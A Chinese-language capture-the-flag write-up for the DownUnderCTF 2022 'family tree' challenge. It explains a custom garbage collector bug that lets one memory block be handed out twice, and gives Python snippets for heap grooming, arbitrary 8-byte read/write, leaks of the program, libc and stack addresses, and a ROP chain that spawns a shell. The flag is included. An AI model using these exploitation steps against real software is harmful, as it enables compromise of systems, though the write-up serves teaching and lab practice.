# DownUnderCTF 2022 family tree Writeup

## 题目简述

程序允许用 `person`、`metadata`、`delete` 和 `dump` 构造人物关系图，对象由自定义分配器管理。分配器使用三色标记清扫垃圾回收：从 `ROOT` 遍历并标记所有可达对象，再释放没有被标记的块。

漏洞不在普通 delete 后继续使用指针，而在 GC 的触发时机：`FTAllocator::Alloc()` 已经从 freelist 取出一个块、但尚未把新 `Person` 挂入对象图时，内存耗尽会调用 `Collect()`。这个“已预留但尚不可达”的块不会被标记，清扫阶段又把它释放，随后同一块可同时分配给 `Person` 和 `Metadata`。

## 解题过程

### 制造 Person/Metadata 重叠

先创建大量根节点子对象耗尽分配器，再删除前四个对象形成可控 freelist：

```python
cmd('person foo ROOT')
for i in range(28):
    cmd(f'person {chr(0x41 + i) * 32} ROOT')

for name in ('A', 'B', 'C', 'D'):
    cmd('delete ROOT.' + name * 32)
```

接着交错创建 `controller`、`target` 及其 metadata。GC 时序错误让一个 metadata 缓冲区与 `target` 的 `Person` 对象共享内存：

```text
person controller ROOT
metadata ROOT.controller
person target ROOT
metadata ROOT.target
```

`dump ROOT.controller` 会把重叠区域作为 metadata 输出，从中可以拆出 `target` 地址、名称指针、metadata 指针以及子节点列表首尾指针。

### 建立任意读写

保留泄漏出的合法对象字段，只把重叠 `Person` 的 metadata 指针换成目标地址附近，即可让 `dump ROOT.target` 从任意地址打印 8 字节；把指针设为目标地址后再次写 `metadata ROOT.target`，则得到任意 8 字节写。

```python
def forge(metadata_ptr):
    return flat(
        b'\0' * 6,
        target_addr,
        target_name_length,
        target_name,
        target_name2,
        metadata_ptr,
        list_start,
        list_end,
    )

def read64(addr):
    set_metadata('ROOT.controller', forge(addr - 10))
    return u64(dump('ROOT.target')[1:9].ljust(8, b'\0'))

def write64(addr, value):
    set_metadata('ROOT.controller', forge(addr))
    set_metadata('ROOT.target', p64(value))
```

读取 `target_addr - 0x20` 的虚表指针可计算 PIE 基址；再读取主程序中的 `stdout` 指针得到 libc 2.27 基址。由 libc 的 `environ` 符号取得栈地址，进而定位当前命令处理函数的保存返回地址。

### 在栈上写入 ROP

使用任意写把以下 `execve("/bin/sh", 0, 0)` 链写到目标栈位置：

```text
pop rdi ; ret  -> "/bin/sh"
pop rsi ; ret  -> 0
pop rdx ; ret  -> 0
pop rax ; ret  -> 59
syscall
```

函数返回后执行 ROP，进入 shell并读取：

```text
DUCTF{4_l0ng_l1n3_0f_g4rb4g3_c0113ct0r5}
```

## 方法总结

自定义 GC 必须把“已分配但尚未挂入对象图”的块也作为临时根处理，否则收集过程会制造双重分配。此题先用对象重叠读取并伪造 `Person` 字段，再逐层完成 PIE、libc、stack 泄漏，最终把任意写转化为栈 ROP。所有结构偏移和 libc 符号偏移都与随题二进制及 libc 2.27 配套，不能直接套到其他构建。
